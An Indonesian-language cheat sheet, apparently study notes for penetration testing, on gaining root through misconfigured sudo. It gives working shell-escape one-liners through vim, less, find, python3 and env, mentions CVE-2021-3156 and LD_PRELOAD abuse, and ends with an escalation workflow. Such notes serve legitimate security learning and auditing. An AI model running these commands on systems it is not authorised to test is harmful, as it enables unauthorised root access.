# Exploiting Sudo

`sudo` memungkinkan user menjalankan command dengan privilege user lain,
biasanya `root`. Jika konfigurasi sudo memberikan akses ke binary tertentu
tanpa batasan yang tepat, binary tersebut dapat berpotensi disalahgunakan
untuk privilege escalation.

## Cek izin sudo

```bash
sudo -l
# Menampilkan command yang boleh dijalankan menggunakan sudo
```

## Cek GTFOBins

Untuk tiap entry -> cek [https://gtfobins.github.io](https://gtfobins.github.io) bagian "Sudo"

**Keterangan:**  
GTFOBins dapat digunakan untuk melihat apakah binary yang diizinkan oleh sudo
memiliki teknik penyalahgunaan pada bagian **Sudo**.

## Contoh Eksploitasi

```bash
sudo vim -c ':!/bin/sh'                       # vim
sudo less /etc/profile  -> !/bin/sh           # less/more
sudo find . -exec /bin/sh \; -quit            # find
sudo python3 -c 'import os;os.system("/bin/sh")'
sudo env /bin/sh
```

**Keterangan singkat:**

```text
vim     → Memanfaatkan command mode untuk menjalankan shell
less    → Memanfaatkan fitur command pada pager
find    → Memanfaatkan opsi -exec untuk menjalankan command
python3  → Menjalankan shell melalui Python
env     → Menjalankan shell melalui environment utility
```

> sudo aman dari dash-drop (ruid=euid=0)

**Keterangan:**  
Ketika command benar-benar dijalankan melalui sudo sebagai root, `ruid` dan
`euid` biasanya sama-sama `0`, sehingga masalah shell yang melakukan
privilege dropping seperti pada beberapa skenario SUID dapat berbeda.

## Cek juga

- sudo versi rentan: CVE-2021-3156 (Baron Samedit)
- `LD_PRELOAD` jika ada di `env_keep`

**Keterangan:**

```text
CVE-2021-3156
→ Vulnerability pada sudo yang dapat menyebabkan local privilege escalation
  pada versi yang terdampak.

LD_PRELOAD
→ Environment variable yang dapat memuat shared library sebelum program
  dijalankan. Periksa konfigurasi env_keep karena dapat menjadi risiko jika
  dikombinasikan dengan konfigurasi sudo yang tidak aman.
```

## Alur

```text
sudo -l
   ↓
Identifikasi command yang diizinkan
   ↓
Cek binary di GTFOBins → Sudo
   ↓
Periksa versi & konfigurasi sudo
   ↓
Validasi permission
   ↓
Uji privilege escalation
   ↓
id → verifikasi privilege
```
